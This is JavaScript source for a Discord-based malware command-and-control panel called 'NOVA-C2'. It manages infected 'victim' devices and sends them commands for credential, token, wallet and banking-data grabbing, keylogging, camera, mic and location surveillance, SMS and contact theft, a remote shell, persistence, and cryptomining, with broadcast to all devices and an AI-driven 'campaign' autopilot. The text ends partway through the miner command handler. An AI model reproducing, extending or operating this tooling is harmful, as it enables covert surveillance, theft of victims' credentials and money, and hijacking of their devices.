import 'dotenv/config'
import {
  Client, GatewayIntentBits, Events, Options,
  ChannelType, SlashCommandBuilder, EmbedBuilder, AttachmentBuilder,
  ActionRowBuilder, ButtonBuilder, ButtonStyle,
  StringSelectMenuBuilder, StringSelectMenuOptionBuilder,
} from 'discord.js'
import { ICONS } from './icons.js'
import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
import { videoStream } from './stream.js'
import { aiCoPilot } from './ai-copilot/index.js'
import { aiContext } from './ai-copilot/context.js'
import { aiController } from './ai-copilot/controller.js'
import { matchAction, getActionHelp } from './ai-copilot/router.js'
import { buildMinerEmbed } from './bot/minerEmbed.js'
import { campaignManager } from './ai-copilot/campaign.js'
import { analyzeResults } from './ai-copilot/analyzer.js'
import { decideNextActions } from './ai-copilot/decider.js'
import { btn, actionRow, paginationRow, bloodEmbed } from './bot/embeds.js'
import { getPhantomChannels, findPhantomChannel, resolveTarget, requireTarget } from './bot/target.js'
import { collectChannelResponse } from './bot/collector.js'
import { createStateStore, reviveMaps } from './bot/state.js'
import { formatDeviceResponse } from './bot/formatter.js'
import { decrypt, encrypt } from './lib/crypto.js'

const { DISCORD_TOKEN, ALLOWED_CHANNEL_ID, ALERTS_CHANNEL_ID } = process.env
if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }

// ── State Maps (persisted) ────────────────────────────────────────────────
const state = createStateStore({})
const targets = state.targets instanceof Map ? state.targets : new Map()
const deviceStatus = state.deviceStatus instanceof Map ? state.deviceStatus : new Map()
state.targets = targets
state.deviceStatus = deviceStatus
const devicePages = new Map()
const rateLimits = new Map()
const commandLog = new Map()
const commandCooldowns = new Map()
const sentCommands = new Map()
const alertCooldown = new Map()
const statusCheckers = new Map()
const deviceCheckLocks = new Set()
const guildCheckLocks = new Set()

// ── Constants ─────────────────────────────────────────────────────────────
const COMMAND_DEDUP_WINDOW = 30000
const HEARTBEAT_TIMEOUT = 11 * 60 * 1000
const STATUS_CHECK_INTERVAL = 5 * 60 * 1000
const PAGINATION_TIMEOUT = 120000
const SELECT_TIMEOUT = 30000
const MAP_CLEANUP_INTERVAL = 600000
const RATE_LIMIT_WINDOW = 5000
const RATE_LIMIT_MAX = 10
const COMMAND_LOG_MAX = 50
const COMMAND_COOLDOWN = 2000
const DESTRUCTIVE_CMDS = ['grabber', 'shell', 'persist', 'update', 'rm', 'mv', 'cp', 'admin', 'overlay']
let botStartTime = Date.now()
let startupMsgSent = false

// ── Discord Client ────────────────────────────────────────────────────────
const client = new Client({
  intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildVoiceStates],
  presence: { status: 'dnd' },
  makeCache: Options.cacheWithLimits({
    MessageManager: 50, GuildMemberManager: 10, UserManager: 50,
    PresenceManager: 0, GuildEmojiManager: 0, GuildBanManager: 0, GuildInviteManager: 0,
    GuildStickerManager: 0, ReactionManager: 0, ReactionUserManager: 0,
    ThreadManager: 0, ThreadMemberManager: 0, VoiceStateManager: 0,
  }),
  sweepers: {
    messages: { interval: 3600, filter: (msg) => Date.now() - msg.createdTimestamp > 1800000 },
    users: { interval: 3600, filter: (user) => user.id !== client.user?.id },
  },
})

// ── Button Definitions ────────────────────────────────────────────────────
const B = {
  victims:    btn('devices',    'VICTIMS',    E.ghost,    'primary'),
  screenshot: btn('screenshot', 'SCREENSHOT', E.eye,      'danger'),
  stream:     btn('stream',     'LIVE',       '📡',       'danger'),
  shell:      btn('shell_btn',  'SHELL',      '💻',       'primary'),
  files:      btn('dir',        'FILES',      '📁',       'primary'),
  grabber:    btn('grabber',    'GRABBER',    '🔍',       'danger'),
  target:     btn('target',     'TARGET',     E.target,   'success'),
  broadcast:  btn('broadcast',  'BROADCAST',  E.bomb,     'danger'),
  info:       btn('info',       'INTEL',      E.bone,     'primary'),
  menu:       btn('menu',       'HOME',       '🏠',       'secondary'),
  help:       btn('help',       'COMMANDS',   E.web,      'secondary'),
  tree:       btn('tree',       'TREE',       '🌲',       'primary'),
  disk:       btn('disk',       'DISK',       '💾',       'primary'),
  contacts:   btn('contacts',   'CONTACTS',   '📇',       'primary'),
  sms:        btn('sms',        'SMS',        '💬',       'primary'),
  location:   btn('location',   'LOCATION',   '📍',       'primary'),
  camera:     btn('camera',     'CAMERA',     '📷',       'danger'),
  dir:        btn('dir',        'DIR',        '📁',       'primary'),
}

// ── Menu Layouts ─────────────────────────────────────────────────────────
const MENU_BTNS = [
  ...actionRow(B.victims, B.screenshot, B.stream, B.shell),
  ...actionRow(B.files, B.grabber, B.broadcast),
  ...actionRow(B.target, B.menu, B.help, B.info),
].flat()

const HELP_BTNS = actionRow(B.menu).flat()

const RESULT_BTNS = [
  ...actionRow(B.screenshot, B.stream, B.shell),
  ...actionRow(B.files, B.grabber, B.contacts, B.sms),
  ...actionRow(B.victims, B.target, B.menu, B.help),
].flat()

const FILES_BTNS = [
  ...actionRow(B.dir, B.tree, B.disk),
  ...actionRow(B.target, B.menu, B.help),
].flat()

const INTEL_BTNS = [
  ...actionRow(B.contacts, B.sms, B.location, B.camera),
  ...actionRow(B.victims, B.target, B.shell, B.grabber),
  ...actionRow(B.menu, B.help),
].flat()

const ALERT_BTNS_ONLINE = (chId) => [
  new ActionRowBuilder().addComponents(
    btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
    btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
    btn('a_ss_' + chId, 'SCREENSHOT', '📸', 'danger'),
    btn('a_grabber_' + chId, 'GRABBER', '🔍', 'danger'),
  ),
  new ActionRowBuilder().addComponents(
    btn('a_stream_' + chId, 'LIVE', '📡', 'danger'),
    btn('a_cmd_' + chId, 'SHELL', '💻', 'primary'),
    btn('a_persist_' + chId, 'PERSIST', '💉', 'primary'),
    btn('a_files_' + chId, 'FILES', '📁', 'primary'),
  ),
]

const ALERT_BTNS_OFFLINE = (chId) => [
  new ActionRowBuilder().addComponents(
    btn('a_menu_' + chId, 'HOME', '🏠', 'secondary'),
    btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
  ),
]

// ── Rate Limiting ────────────────────────────────────────────────────────
function isRateLimited(uid) {
  const now = Date.now()
  const data = rateLimits.get(uid)
  if (!data) { rateLimits.set(uid, { count: 1, ts: now }); return false }
  if (now - data.ts > RATE_LIMIT_WINDOW) { rateLimits.set(uid, { count: 1, ts: now }); return false }
  if (data.count >= RATE_LIMIT_MAX) return true
  data.count++
  return false
}

function isOnCooldown(uid) {
  const now = Date.now()
  const cd = commandCooldowns.get(uid)
  if (!cd || now - cd > COMMAND_COOLDOWN) { commandCooldowns.set(uid, now); return false }
  return true
}

function logCommand(userId, userName, cmd, payload, channelName) {
  const entry = { user: userName, cmd, payload, channel: channelName, ts: Date.now() }
  if (!commandLog.has(userId)) commandLog.set(userId, [])
  const log = commandLog.get(userId)
  log.push(entry)
  if (log.length > COMMAND_LOG_MAX) log.shift()
}

function formatCommandLog(userId) {
  const log = commandLog.get(userId) || []
  if (!log.length) return 'No commands executed'
  return log.slice(-15).reverse().map(e => {
    const ago = Math.round((Date.now() - e.ts) / 60000)
    const timeStr = ago < 1 ? 'just now' : `${ago}m ago`
    return `\`${e.cmd}${e.payload ? ' ' + e.payload : ''}\` → ${e.channel} (${timeStr})`
  }).join('\n')
}

// ── Command Sending ─────────────────────────────────────────────────────
async function sendCmd(channel, cmd, payload = '', retries = 3) {
  const content = payload ? `!${cmd} ${payload}` : `!${cmd}`
  const dedupKey = `${channel.id}:${content}`
  const now = Date.now()
  for (const [key, ts] of sentCommands) { if (now - ts > COMMAND_DEDUP_WINDOW) sentCommands.delete(key) }
  if (sentCommands.has(dedupKey)) return { ok: true, name: channel.name, dedup: true }
  sentCommands.set(dedupKey, now)

  for (let attempt = 0; attempt <= retries; attempt++) {
    try {
      const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('SEND_TIMEOUT')), 15000))
      await Promise.race([channel.send(content), timeout])
      return { ok: true, name: channel.name }
    } catch (e) {
      if (e.message?.includes('Unknown Message')) return { ok: false, err: 'channel_gone' }
      const retryable = e.code === 429 || e.status === 429 || e.status >= 500 || e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT' || e.message === 'SEND_TIMEOUT'
      if (retryable && attempt < retries) {
        const wait = Math.min(e.retryAfter || e.retryAfterMs || 1000 * Math.pow(2, attempt), 30000)
        await new Promise(r => setTimeout(r, wait))
        continue
      }
      return { ok: false, err: e.message }
    }
  }
  return { ok: false, err: 'max_retries' }
}

async function sendCmdLogged(channel, cmd, payload, userId, userName) {
  const result = await sendCmd(channel, cmd, payload)
  if (result.ok) logCommand(userId, userName, cmd, payload, channel.name)
  return result
}

async function sendToTarget(uid, guild, cmd, payload) {
  const resolved = resolveTarget(guild, targets, uid)
  if (!resolved.channel) return { ok: false, err: resolved.err }
  return sendCmd(resolved.channel, cmd, payload)
}

// ── Embed Builders ──────────────────────────────────────────────────────
function menuEmbed() {
  const total = [...deviceStatus.values()].filter(s => s.online === true).length
  const totalDevices = deviceStatus.size
  return bloodEmbed(bold(`${E.sharingan} NOVA-C2 ${E.sharingan}`), 'info',
    `**${E.flame} C2 Framework v3.1**\n${clockText()}\n\n` +
    `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${totalDevices - total} offline\n\n` +
    `**${E.eye} Commands**\n` +
    `• \`!devices\` — List all victims\n` +
    `• \`!target <name>\` — Select victim\n` +
    `• \`!untarget\` — Clear target\n` +
    `• \`!broadcast <cmd>\` — Send to ALL\n` +
    `• \`!send <cmd> <victim>\` — Direct send\n` +
    `• \`!help\` — Full command reference\n` +
    `• \`!history\` — Command log\n` +
    `• \`!search <query>\` — Find victim\n` +
    `• \`!ai <request>\` — AI Co-Pilot\n` +
    `• \`!campaign <obj>\` — Autopilot\n` +
    `• \`!analyze\` — Intel analysis\n\n` +
    `**${E.star} Slash Commands**\n` +
    `\`/menu\` \`/help\` \`/devices\` \`/target\` \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\` \`/files\`\n\n` +
    `**${total > 0 ? `${E.knife} ${total} device(s) online — target one to begin` : `${E.coffin} Waiting for devices...`}**`,
    { footer: `${E.skull} NOVA-C2 ⚡ ${ts()}`, thumb: randGif() })
}

function helpEmbed() {
  const clk = clockText()
  const box = createBox(
    `${A.brightCyan}${smallCaps('command reference')}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}RECON${A.reset}      : !ping !sysinfo !antidetect !ip !uptime !status\n` +
    `${A.cyan}┃${A.reset} ${A.green}       ${A.reset}      : !sysprop !services !apps !storage !battery\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}SURVEILL${A.reset}    : !screenshot !camera !mic !location !clipboard\n` +
    `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !keylog !stream !notifications\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}INTEL${A.reset}       : !contacts !sms !call_log !wifi !installed\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}       ${A.reset}      : !processes !torch !vibrate\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightRed}GRABBER${A.reset}    : !grabber [all|browser|messenger|tokens|wallets]\n` +
    `${A.cyan}┃${A.reset} ${A.brightRed}       ${A.reset}      : !grabber [files|clipboard|banks|whatsapp|chrome|docs]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}FILES${A.reset}       : !dir !ls !tree !find !cat !info !disk\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}       ${A.reset}      : !recent !ext !download !rm !mv !cp !mkdir\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.yellow}ADVANCED${A.reset}   : !wifipass !netstat !shell !persist\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.red}CONTROL${A.reset}    : !admin !overlay !click !input !open !screen\n` +
    `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !gesture !pin\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.magenta}MINING${A.reset}     : !miner [start|stop|status|set_wallet|set_pool]\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.brightCyan}SYSTEM${A.reset}     : !update !config !upload\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}BOT${A.reset}         : !help !menu !devices !target !untarget\n` +
    `${A.cyan}┃${A.reset} ${A.green}   ${A.reset}         : !broadcast !history !search !ai !campaign !analyze\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.green}◈ ${clk}${A.reset}`,
    'neon', 58
  )
  return {
    embeds: [new EmbedBuilder()
      .setColor(C.sharingan)
      .setTitle(`${E.sharingan} NOVA-C2 — FULL COMMAND REFERENCE`)
      .setDescription(`\`\`\`ansi\n${box}\n\`\`\``)
      .setThumbnail(randGif())
      .addFields(
        { name: `${E.zap} RECON`, value: '`!ping` `!sysinfo` `!antidetect` `!ip` `!uptime` `!battery`', inline: true },
        { name: `${E.eye} SURVEILLANCE`, value: '`!screenshot` `!camera` `!mic` `!location` `!clipboard` `!keylog` `!stream`', inline: true },
        { name: `${E.book} INTEL`, value: '`!contacts` `!sms` `!call_log` `!wifi` `!installed` `!processes`', inline: true },
        { name: `${E.diamond} GRABBER`, value: '`!grabber [all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs]`', inline: true },
        { name: `${E.scroll} FILES`, value: '`!dir` `!tree` `!find` `!cat` `!info` `!disk` `!recent` `!ext` `!download` `!rm` `!mv` `!cp` `!mkdir`', inline: true },
        { name: `${E.flame} ADVANCED`, value: '`!wifipass` `!netstat` `!shell` `!persist`', inline: true },
        { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen` `!pin`', inline: true },
        { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
        { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
        { name: `${E.brain} BOT CMDS`, value: '`!ai` `!campaign` `!analyze` `!history` `!search`', inline: true },
      )
      .setFooter({ text: `${E.skull} NOVA-C2 v3.1 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
    ],
  }
}

function victimListEmbed(status, onlineCount, totalCount, page = 1, totalPages = 1) {
  return bloodEmbed(bold(`${E.sharingan} VICTIMS: ${totalCount}`), onlineCount > 0 ? 'online' : 'offline',
    `\`\`\`ansi\n${status}\n\`\`\``,
    { footer: `${smallCaps('page')} ${page}/${totalPages} ${E.rocket} ${onlineCount}/${totalCount} alive`, thumb: randGif() })
}

// ── Device Page Builder ─────────────────────────────────────────────────
function buildDevicePages(guild) {
  const channels = getPhantomChannels(guild)
  const sorted = [...channels.values()].sort((a, b) => a.name.localeCompare(b.name, 'en'))
  if (!sorted.length) return []
  const onlineCount = sorted.filter(ch => deviceStatus.get(ch.id)?.online === true).length
  const pages = []
  for (let i = 0; i < sorted.length; i += 5) {
    const slice = sorted.slice(i, i + 5)
    const lines = [`${A.brightCyan}${smallCaps('victims')}${A.reset}`]
    for (const ch of slice) {
      const st = deviceStatus.get(ch.id)
      const on = st?.online ?? false
      const ago = st?.lastSeen ? `${Math.round((Date.now() - st.lastSeen) / 60000)}m` : '?'
      const status = on ? `${A.green}${E.sparkles} ALIVE${A.reset}` : `${A.grey}${E.coffin} DEAD${A.reset}`
      const dot = on ? E.online : E.offline
      lines.push(`${A.cyan}┃${A.reset} ${dot} ${mono(ch.name.replace('device-', ''))} ${on ? barAnim(1, 1, 5) : '░░░░░'} ${status} ${A.grey}(${ago})${A.reset}`)
    }
    const pct = sorted.length ? Math.round((onlineCount / sorted.length) * 100) : 0
    lines.push('', `${A.green}◈ ${onlineCount}/${sorted.length} alive ${E.flame}(${pct}%)${A.reset}`)
    const body = createBox(lines.join('\n'), 'neon', 40)
    const p = Math.floor(i / 5) + 1
    const t = Math.ceil(sorted.length / 5)
    const embed = victimListEmbed(body, onlineCount, sorted.length, p, t)
    const comps = sorted.length > 5 ? [...paginationRow(), ...MENU_BTNS] : MENU_BTNS
    pages.push({ embeds: embed.embeds, components: comps })
  }
  return pages
}

function devSelectPages(channels) {
  const arr = [...channels.values()]
  const pages = []
  for (let i = 0; i < arr.length; i += 25) {
    const slice = arr.slice(i, i + 25)
    const p = Math.floor(i / 25) + 1
    const t = Math.ceil(arr.length / 25)
    const menu = new StringSelectMenuBuilder()
      .setCustomId('sel').setPlaceholder(`Select victim (page ${p}/${t})...`)
      .addOptions(slice.map(ch => new StringSelectMenuOptionBuilder().setLabel(ch.name).setDescription(`ID: ${ch.id}`).setValue(ch.id)))
    const comps = [new ActionRowBuilder().addComponents(menu)]
    if (t > 1) comps.push(new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId('sel_prev').setLabel('◀ PREV').setStyle(ButtonStyle.Primary).setDisabled(p === 1),
      new ButtonBuilder().setCustomId('sel_next').setLabel('NEXT ▶').setStyle(ButtonStyle.Primary).setDisabled(p === t),
    ))
    pages.push({ components: comps, page: p, total: t })
  }
  return pages
}

// ── Alert Channel ───────────────────────────────────────────────────────
async function getAlertChannel() {
  const id = (ALERTS_CHANNEL_ID || ALLOWED_CHANNEL_ID || '').trim()
  if (!id) return null
  try { return await client.channels.fetch(id) } catch { return null }
}

// ── Slash Commands ──────────────────────────────────────────────────────
const SLASH_CMDS = [
  new SlashCommandBuilder().setName('menu').setDescription('Open control panel'),
  new SlashCommandBuilder().setName('help').setDescription('Show command reference'),
  new SlashCommandBuilder().setName('devices').setDescription('List all connected victims'),
  new SlashCommandBuilder().setName('target').setDescription('Select a victim').addStringOption(o => o.setName('name').setDescription('Victim channel name').setRequired(false)),
  new SlashCommandBuilder().setName('untarget').setDescription('Clear current target'),
  new SlashCommandBuilder().setName('broadcast').setDescription('Send command to all devices').addStringOption(o => o.setName('command').setDescription('Command').setRequired(true)),
  new SlashCommandBuilder().setName('history').setDescription('Show your command log'),
  new SlashCommandBuilder().setName('search').setDescription('Search victims').addStringOption(o => o.setName('query').setDescription('Search query').setRequired(true)),
  new SlashCommandBuilder().setName('send').setDescription('Send command to victim').addStringOption(o => o.setName('command').setDescription('Command name').setRequired(true)).addStringOption(o => o.setName('victim').setDescription('Victim name').setRequired(false)).addStringOption(o => o.setName('args').setDescription('Arguments').setRequired(false)),
  new SlashCommandBuilder().setName('grabber').setDescription('Run data grabber').addStringOption(o => o.setName('target').setDescription('Target: all|browser|messenger|tokens|wallets|files|clipboard|banks|whatsapp|chrome|docs').setRequired(false)),
  new SlashCommandBuilder().setName('files').setDescription('File manager').addStringOption(o => o.setName('action').setDescription('Action: dir|tree|find|cat|disk|recent|download').setRequired(true)).addStringOption(o => o.setName('path').setDescription('Path or pattern').setRequired(false)),
  new SlashCommandBuilder().setName('miner').setDescription('XMR mining control').addStringOption(o => o.setName('action').setDescription('Action: start|stop|status|set_wallet|set_pool|set_threads').setRequired(false)).addStringOption(o => o.setName('value').setDescription('Value').setRequired(false)),
  new SlashCommandBuilder().setName('upload').setDescription('Upload file from device').addStringOption(o => o.setName('path').setDescription('File path').setRequired(true)),
  new SlashCommandBuilder().setName('stream').setDescription('Screen stream control').addStringOption(o => o.setName('action').setDescription('start|stop|fps').setRequired(false)),
  new SlashCommandBuilder().setName('voicestream').setDescription('Voice channel video stream').addChannelOption(o => o.setName('channel').setDescription('Voice channel').addChannelTypes(2).setRequired(false)),
  new SlashCommandBuilder().setName('streamstop').setDescription('Stop voice stream'),
  new SlashCommandBuilder().setName('streamstatus').setDescription('Check stream status'),
].map(c => c.toJSON())

async function registerSlashCommands(guild) {
  try { await guild.commands.set(SLASH_CMDS); console.log(`[+] Slash commands registered in ${guild.name}`) }
  catch (e) { console.error(`[!] Slash commands failed: ${e.message}`) }
}

// ── Helper: get device channel from slash + handle multi-device ─────────
async function getSlashTarget(i, guild, uid, victimName = null) {
  if (victimName) {
    const ch = findPhantomChannel(guild, victimName)
    return ch ? { channel: ch, name: ch.name, err: null } : { channel: null, err: `not_found: ${victimName}` }
  }
  const resolved = await requireTarget(guild, targets, uid)
  if (resolved.channel) return resolved
  if (resolved.err === 'multi_device') return { channel: null, err: 'multi_device', channels: resolved.channels }
  return { channel: null, err: resolved.err }
}

// ── Helper: handle multi-device for slash commands ──────────────────────
async function handleMultiDeviceSlash(i, channels, cmd, payload, uid, username) {
  const pages = devSelectPages(channels)
  if (!pages.length) return i.editReply(`${E.coffin} No devices ${E.skull}`)
  const m = await i.editReply({ content: `Select victim for \`!${cmd}\` ${E.knife}`, components: pages[0].components })
  if (pages.length > 1) devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
  const col = (await i.channel || i.channel).createMessageComponentCollector({
    filter: si => si.user.id === uid && si.customId === 'sel' && si.message.id === m.id,
    time: SELECT_TIMEOUT, max: 1,
  })
  col.on('collect', async si => {
    const ch = guild.channels.cache.get(si.values[0])
    if (ch) {
      const r = await sendCmdLogged(ch, cmd, payload || '', uid, username)
      if (r.ok) targets.set(uid, { chId: ch.id, ts: Date.now() })
    }
    await si.update({ content: `${E.knife} \`!${cmd}\` sent ${E.skull}`, components: [] })
  })
  col.on('end', async collected => { if (!collected.size) try { await m.edit({ content: `${E.coffin} Timed out ${E.skull}`, components: [] }) } catch {} })
}

// ── INTERACTION HANDLER ─────────────────────────────────────────────────
client.on(Events.InteractionCreate, async (i) => {
  if (i.isChatInputCommand()) {
    if (ALLOWED_CHANNEL_ID && i.channelId !== ALLOWED_CHANNEL_ID) {
      try { await i.reply({ content: `${E.warning} Use control channel`, ephemeral: true }) } catch {}
      return
    }
    try { await i.deferReply({ ephemeral: true }) } catch (e) {
      try { await i.reply({ content: `${E.coffin} Error: ${e.message}`, ephemeral: true }) } catch {}
      return
    }
    const { commandName, options, user, guild } = i
    const uid = user.id
    if (!guild) return i.editReply(`${E.coffin} Server only ${E.skull}`).catch(() => {})
    if (isOnCooldown(uid)) return i.editReply(`${E.skull} Cooldown`).catch(() => {})

    try {
      switch (commandName) {
        case 'menu': return i.editReply({ ...menuEmbed(), components: MENU_BTNS })
        case 'help': return i.editReply({ ...helpEmbed(), components: HELP_BTNS })
        case 'devices': {
          await guild.channels.fetch(); await refreshDeviceStatus(guild, false)
          const pages = buildDevicePages(guild)
          if (!pages.length) return i.editReply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices ${E.skull}`).embeds })
          const reply = await i.editReply({ embeds: pages[0].embeds, components: pages[0].components })
          if (pages.length > 1) {
            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
            setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
          }
          return
        }
        case 'target': {
          const name = options.getString('name')
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return i.editReply(`${E.coffin} No victims ${E.skull}`)
          if (name) {
            const ch = findPhantomChannel(guild, name)
            if (!ch) return i.editReply(`${E.coffin} **${name}** not found ${E.skull}`)
            targets.set(uid, { chId: ch.id, ts: Date.now() })
            return i.editReply(`${E.knife} Target: ${ch.name} ${E.skull}`)
          }
          if (channels.size === 1) { targets.set(uid, { chId: channels.first().id, ts: Date.now() }); return i.editReply(`${E.knife} Target: ${channels.first().name} ${E.skull}`) }
          const pages = devSelectPages(channels)
          const reply = await i.editReply({ content: `Select victim ${E.knife}`, components: pages[0].components })
          if (pages.length > 1) devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
          return
        }
        case 'untarget': {
          const had = targets.delete(uid)
          return i.editReply({ ...bloodEmbed(bold('TARGET CLEARED'), 'warning', `${E.coffin} ${had ? 'Released.' : 'None set.'} ${E.skull}`), components: MENU_BTNS })
        }
        case 'broadcast': {
          const bc = options.getString('command').trim()
          const p = bc.replace(/^!+/, '').split(/\s+/)
          const bcCmd = p[0], bcPayload = p.slice(1).join(' ')
          if (!VALID_CMDS.has(bcCmd)) return i.editReply(`${E.warning} Invalid: \`!${bcCmd}\` ${E.skull}`)
          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.includes('--force')) {
            return i.editReply(`${E.bomb} **Confirm?** \`!${bcCmd}\` to ALL. Use \`!broadcast ${bcCmd} --force\` in text chat.`)
          }
          await guild.channels.fetch()
          const channels = getPhantomChannels(guild)
          if (!channels.size) return i.editReply(`${E.coffin} No devices ${E.skull}`)
          let sent = 0, failed = [], retryQueue = []
          for (const [, ch] of channels) {
            const r = await sendCmdLogged(ch, bcCmd, bcPayload, uid, user.username)
            if (r.ok) sent++; else retryQueue.push({ ch, name: ch.name })
            if (channels.size > 3) await new Promise(r => setTimeout(r, 1200))
          }
          for (const item of retryQueue) {
            await new Promise(r => setTimeout(r, 2000))
            if ((await sendCmdLogged(item.ch, bcCmd, bcPayload, uid, user.username)).ok) sent++; else failed.push(item.name)
          }
          return i.editReply({ ...bloodEmbed(bold('BROADCAST'), 'online', `\`\`\`ansi\n${createBox(`${A.brightRed}${smallCaps('broadcast')}${A.reset}\n${A.red}┃${A.reset} ${mono('!' + bcCmd + (bcPayload ? ' ' + bcPayload : ''))}\n${A.red}┃${A.reset} ${A.grey}sent: ${sent}/${channels.size}${A.reset}${failed.length ? '\n' + A.red + '┃' + A.reset + ' ' + A.grey + 'failed: ' + failed.join(', ') + A.reset : ''}`, 'neon', 36)}\`\`\``), components: RESULT_BTNS })
        }
        case 'history': return i.editReply({ ...bloodEmbed(bold('COMMAND HISTORY'), 'info', `\`\`\`${formatCommandLog(uid)}\n\`\`\``, { footer: `${smallCaps('last 15')} ⚡ ${ts()}` }), components: MENU_BTNS })
        case 'search': {
          const query = options.getString('query').toLowerCase()
          await guild.channels.fetch()
          const matches = [...getPhantomChannels(guild).values()].filter(ch => ch.name.toLowerCase().includes(query))
          if (!matches.length) return i.editReply(`${E.coffin} No matches for "${query}" ${E.skull}`)
          const lines = [`${A.brightCyan}${smallCaps('search results')}${A.reset}`]
          for (const ch of matches) {
            const st = deviceStatus.get(ch.id); const on = st?.online ?? false
            lines.push(`${A.cyan}┃${A.reset} ${on ? E.online : E.offline} ${mono(ch.name)}`)
          }
          return i.editReply({ ...bloodEmbed(bold(`SEARCH: "${query}"`), 'warning', `\`\`\`ansi\n${createBox(lines.join('\n'), 'neon', 36)}\n\`\`\``, { footer: `${matches.length} result(s)` }), components: MENU_BTNS })
        }
        case 'send': {
          const cmd = options.getString('command').replace(/^!+/, '')
          const victimName = options.getString('victim')
          const cmdArgs = options.getString('args') || ''
          if (!VALID_CMDS.has(cmd)) return i.editReply(`${E.warning} Invalid: \`!${cmd}\` ${E.skull}`)
          await guild.channels.fetch()
          const t = await getSlashTarget(i, guild, uid, victimName)
          if (!t.channel) return t.err === 'multi_device' ? handleMultiDeviceSlash(i, t.channels, cmd, cmdArgs, uid, user.username) : i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, cmd, cmdArgs, uid, user.username)
          return r.ok ? i.editReply(`${E.knife} \`!${cmd}${cmdArgs ? ' ' + cmdArgs : ''}\` sent to \`${t.name}\` ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'grabber': {
          const target = options.getString('target') || 'all'
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return t.err === 'multi_device' ? handleMultiDeviceSlash(i, t.channels, 'grabber', target, uid, user.username) : i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, 'grabber', target, uid, user.username)
          return r.ok ? i.editReply(`${E.knife} Grabber: \`${target}\` ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'files': {
          const action = options.getString('action')
          const path = options.getString('path') || ''
          const fileCmd = action === 'dir' ? 'dir' : action === 'tree' ? 'tree' : action === 'find' ? `find ${path}` : action === 'cat' ? `cat ${path}` : action === 'disk' ? 'disk' : action === 'recent' ? `recent ${path || '20'}` : action === 'download' ? `download ${path}` : action
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return t.err === 'multi_device' ? handleMultiDeviceSlash(i, t.channels, fileCmd, '', uid, user.username) : i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          const r = await sendCmdLogged(t.channel, fileCmd, '', uid, user.username)
          return r.ok ? i.editReply(`${E.knife} \`!${fileCmd}\` sent ${E.skull}`) : i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
        }
        case 'miner': {
          const action = options.getString('action') || 'status'
          const value = options.getString('value') || ''
          const payload = value ? `${action} ${value}` : action
          await guild.channels.fetch()
          const t = await requireTarget(guild, targets, uid)
          if (!t.channel) return i.editReply(`${E.coffin} ${t.err} ${E.skull}`)
          if (action === 'status') {
            const r = await sendCmd(t.channel, 'miner', 'status')
            if (!r.ok) return i.editReply(`${E.coffin} ${r.err} ${E.skull}`)
            const resp = await collectChannelResponse(t.channel, 'miner', 30000)
            if (resp) {
              const { embed } = buildMinerEmbed(resp, t.channel.name.replace('device-', ''))
              return i.editReply({ embeds: [embed] })
            }
            return i.editReply(`${E.knife} Miner status sent ${E.skull}`)
          }
          const r = await sendCmdLogged(t.channel, 'miner', payload, uid, user.username)
